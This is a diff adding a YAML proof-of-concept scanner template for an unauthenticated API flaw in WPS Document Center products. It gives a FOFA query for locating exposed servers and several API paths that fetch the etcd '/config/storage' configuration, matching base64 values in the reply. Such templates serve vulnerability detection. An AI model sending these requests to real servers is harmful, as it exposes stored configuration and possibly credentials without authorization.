@@ -1,0 +1,29 @@
+id: poc-yaml-wps-dc-wendang-zhongtai-api-unauthorized-access
+info:
+  name: WPS文档中心和文档中台 api 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: WPS文档中心和文档中台
+  fofa: body="content=\"WPS文档中心" || (body="window.PUBLICPATH=" && body="window.WEBPATH=")
+variables:
+  paths: 'open/v6/api/etcd/operate?key=/config/storage&method=get
+
+    open/api/etcd/operate?key=/config/storage&method=get
+
+    mgr/api/etcd/operate?key=/config/storage&method=get
+
+    mgr/api/mq/v1/receive/msg?key=/config/storage&method=get
+
+    open/api/tools/v1/collect/appactivity?key=/config/storage&method=get
+
+    mgr/api/tools/v1/collect/appactivity?key=/config/storage&method=get
+
+    '
+requests:
+- method: GET
+  path: /{{.paths}}
+  expression: status_code == 200 && matches(body,"\"value\":\"([A-Za-z0-9+/]+(?:={1,2})?)\"")
+    && matches(body,"\"request_id\":\"([a-z0-9]+)\"") && contains(body,"request_time")
+    && contains(content_type,"application/json")
+transport: http
